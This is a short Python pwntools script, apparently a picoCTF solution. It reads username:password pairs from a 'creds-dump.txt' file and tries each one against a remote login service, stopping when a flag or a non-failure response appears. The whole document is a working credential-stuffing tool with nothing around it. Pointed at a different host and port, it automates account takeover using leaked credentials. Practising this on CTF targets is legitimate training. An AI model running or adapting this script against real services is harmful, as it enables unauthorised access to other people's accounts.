#!/usr/bin/env python3
from pwn import *
import re

HOST = "crystal-peak.picoctf.net"
PORT = 64198
DUMP = "creds-dump.txt"

def parse_creds(path):
    creds = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if ":" in line:
                user, pw = line.split(":", 1)
                creds.append((user.strip(), pw.strip()))
            elif "," in line:
                user, pw = line.split(",", 1)
                creds.append((user.strip(), pw.strip()))
    return creds

def try_login(user, pw):
    io = remote(HOST, PORT, timeout=5)

    data = io.recvrepeat(1).decode(errors="ignore")
    # Adjust these two sends if the service uses different prompts/order.
    io.sendline(user.encode())
    io.recvrepeat(0.2)
    io.sendline(pw.encode())

    out = io.recvrepeat(1.5).decode(errors="ignore")
    full = data + out
    io.close()
    return full

def main():
    creds = parse_creds(DUMP)
    print(f"[+] Loaded {len(creds)} credentials")

    for i, (user, pw) in enumerate(creds, 1):
        try:
            print(f"[{i}/{len(creds)}] Trying {user}:{pw}")
            resp = try_login(user, pw)

            if "flag{" in resp.lower() or "picoctf{" in resp.lower():
                print("\n[+] FLAG FOUND")
                print(resp)
                return

            bad_markers = ["incorrect", "invalid", "failed", "denied", "try again"]
            if not any(m in resp.lower() for m in bad_markers):
                print(f"\n[+] Possible valid credentials: {user}:{pw}")
                print(resp)
                return

        except Exception as e:
            print(f"[-] Error with {user}:{pw} -> {e}")

    print("[-] No flag found")

if __name__ == "__main__":
    main()
